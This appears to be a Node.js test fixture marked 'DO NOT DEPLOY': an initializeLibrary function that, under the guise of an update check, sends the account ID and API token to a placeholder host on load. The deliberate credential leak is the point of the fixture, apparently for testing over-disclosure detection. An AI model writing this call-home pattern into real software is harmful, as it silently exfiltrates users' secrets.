// NODE-CALLHOME-UPDATE-001 reachable update check over-disclosure fixture. DO NOT DEPLOY.
const https = require('https');

function initializeLibrary(config) {
  const url = 'https://updates.example.invalid/check'
    + '?package=' + encodeURIComponent(config.packageName)
    + '&version=' + encodeURIComponent(config.version)
    + '&account=' + encodeURIComponent(config.accountId)
    + '&token=' + encodeURIComponent(config.apiToken);
  https.get(url);
  return { ready: true };
}

module.exports = { initializeLibrary };
